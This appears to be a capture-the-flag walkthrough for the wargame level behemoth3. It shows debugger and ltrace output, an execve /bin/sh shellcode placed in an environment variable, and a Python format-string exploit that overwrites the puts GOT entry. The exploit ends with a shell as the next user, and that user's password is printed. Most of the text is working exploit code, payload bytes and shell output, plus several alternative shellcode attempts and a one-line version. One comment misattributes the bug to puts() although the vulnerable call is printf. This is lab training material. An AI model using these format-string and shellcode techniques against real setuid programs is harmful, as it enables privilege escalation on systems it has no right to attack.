behemoth3@behemoth:/tmp/qw$ ltrace /behemoth/behemoth3
__libc_start_main(0x804847b, 1, 0xffffd6d4, 0x80484e0 <unfinished ...>
printf("Identify yourself: ")                                 = 19
fgets(Identify yourself: user
"user\n", 200, 0xf7fc55a0)                              = 0xffffd570
printf("Welcome, ")                                           = 9
printf("user\n"Welcome, user
)                                              = 5
puts("\naaaand goodbye again."
aaaand goodbye again.
)                               = 23
+++ exited (status 0) +++


behemoth3@behemoth:/tmp/qw$ gdb -q /behemoth/behemoth3
Reading symbols from /behemoth/behemoth3...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel
(gdb) disas main
Dump of assembler code for function main:
   0x0804847b <+0>:	push   ebp
   0x0804847c <+1>:	mov    ebp,esp
   0x0804847e <+3>:	sub    esp,0xc8
   0x08048484 <+9>:	push   0x8048560
   0x08048489 <+14>:	call   0x8048330 <printf@plt>
   0x0804848e <+19>:	add    esp,0x4
   0x08048491 <+22>:	mov    eax,ds:0x80497c0
   0x08048496 <+27>:	push   eax
   0x08048497 <+28>:	push   0xc8
   0x0804849c <+33>:	lea    eax,[ebp-0xc8]
   0x080484a2 <+39>:	push   eax
   0x080484a3 <+40>:	call   0x8048340 <fgets@plt>
   0x080484a8 <+45>:	add    esp,0xc
   0x080484ab <+48>:	push   0x8048574
   0x080484b0 <+53>:	call   0x8048330 <printf@plt>
   0x080484b5 <+58>:	add    esp,0x4
   0x080484b8 <+61>:	lea    eax,[ebp-0xc8]
   0x080484be <+67>:	push   eax
   0x080484bf <+68>:	call   0x8048330 <printf@plt>
   0x080484c4 <+73>:	add    esp,0x4
   0x080484c7 <+76>:	push   0x804857e
   0x080484cc <+81>:	call   0x8048350 <puts@plt>
   0x080484d1 <+86>:	add    esp,0x4
   0x080484d4 <+89>:	mov    eax,0x0
   0x080484d9 <+94>:	leave  
   0x080484da <+95>:	ret    
End of assembler dump.
//examing gdb of behemoth3 reveals a possible attack vector by exploiting a string formating error in the puts() method.

behemoth3@behemoth:/tmp/qw$ ltrace /behemoth/behemoth3
__libc_start_main(0x804847b, 1, 0xffffd774, 0x80484e0 <unfinished ...>
printf("Identify yourself: ")                                                                                         = 19
fgets(Identify yourself: user.%x.%x.%x.%x
"user.%x.%x.%x.%x\n", 200, 0xf7fc55a0)                                                                          = 0xffffd610
printf("Welcome, ")                                                                                                   = 9
printf("user.%x.%x.%x.%x\n", 0x72657375, 0x2e78252e, 0x252e7825, 0x78252e78 Welcome, user.72657375.2e78252e.252e7825.78252e78
)                                          = 41
puts("\naaaand goodbye again."
aaaand goodbye again.
)                                                                                       = 23
+++ exited (status 0) +++
//paste a custom format string and see the results in ltrace. 

//add MAGICKEY to env vars
export MAGICKEY=$(python -c 'print 20 * "\x90" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + 20 * "\x90"')

// check the memory location of put()
behemoth3@behemoth:/tmp/qw$ objdump -R /behemoth/behemoth3

/behemoth/behemoth3:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
0x08049794 R_386_GLOB_DAT    __gmon_start__
0x080497c0 R_386_COPY        stdin@@GLIBC_2.0
0x080497a4 R_386_JUMP_SLOT   printf@GLIBC_2.0
0x080497a8 R_386_JUMP_SLOT   fgets@GLIBC_2.0
0x080497ac R_386_JUMP_SLOT   puts@GLIBC_2.0
0x080497b0 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0


//get the memory location of MAGICKEY using mem_loc.c
behemoth3@behemoth:/tmp/qw$ touch mem_loc.c
behemoth3@behemoth:/tmp/qw$ vim mem_loc.c 
behemoth3@behemoth:/tmp/qw$ gcc -m32 mem_loc.c -o mem_loc
behemoth3@behemoth:/tmp/qw$ ./mem_loc MAGICKEY
MAGICKEY is at 0xffffde49
//create memory addr printing c method to find location of MAGICKEY

//RETRY
//run gdb to examine if the memory location can be read in at put()'s location
behemoth3@behemoth:/tmp/qw$ gdb -q /behemoth/behemoth3
Reading symbols from /behemoth/behemoth3...(no debugging symbols found)...done.
(gdb) break *main
Breakpoint 1 at 0x804847b
(gdb) run
Starting program: /behemoth/behemoth3

Breakpoint 1, 0x0804847b in main ()
(gdb) x/s *((char **)environ)
...
0xffffde2d:     "MAGICKEY=", '\220' <repeats 20 times>, "\061\300Ph//shh/bin\211\343\211\301\211°\v̀1\300@̀", '\220' <repeats 20 times>
(gdb) break *main+81
Breakpoint 2 at 0x80484cc
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /behemoth/behemoth3

Breakpoint 1, 0x0804847b in main ()
(gdb) continue
Continuing.
Identify yourself: user
Welcome, user

Breakpoint 2, 0x080484cc in main ()
(gdb) x/wx 0x080497ac
0x80497ac:      0x08048356
(gdb) continue
Continuing.

aaaand goodbye again.
[Inferior 1 (process 11289) exited normally]
#python exploit file
#!/usr/bin/env/python

from struct import *
myexp = open("mal.txt", "w")

mem_buf =  "\xac\x97\x04\x08" #memloc put()
mem_buf += "\xae\x97\x04\x08" #memloc put() + 2

# MAGICKEY at 0xffffde49

mem_buf += "%56897x%1$hn" #0xde49 = 0x56905 - 8 = 56897
mem_buf += "%8630x%1$hn" #0xffff-0xde49 = 0x21B6 = 8630
mem_buf += "\n"

myexp.write(mem_buf)
myexp.close()

//pipe contents of exploit into into behemoth3
behemoth3@behemoth:/tmp/qw$ (cat mal.txt;cat) | /behemoth/behemoth3
Identify yourself: Welcome, 

whoami
behemoth4
cat /etc/behemoth_pass/behemoth4
ietheishei

///////////////////////////////////////////////////////////////////////////////
//extra attempts

export MAGICKEY=$(python -c 'print 21 * "\x90" + "\xeb\x19\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x04\xb3\x01\x59\xb2\x0a\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe2\xff\xff\xff\x54\x72\x79\x20"')
//export MAGICKEY=$(python -c 'print "\x90" * 32 "\xeb\x19\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x04\xb3\x01\x59\xb2\x0a\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe2\xff\xff\xff\x54\x72\x79\x20"')
//behemoth3@behemoth:/tmp/qw$ export MAGICKEY=$(python -c 'print "\x90"* 128 + "\x12\xff\xff\xff\x54\x72\x79\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x50\x64\xcf\x87\x69\x6e\x89\xe3\x89\xe2\xff\x54" + 20 * "\x90"')

//Don't need exploit.py if you run this command #(python -c 'print "\xac\x97\x04\x08\xae\x97\x04\x08%56897x%1$hn%8630x%2$hn"';cat) | /behemoth/behemoth3
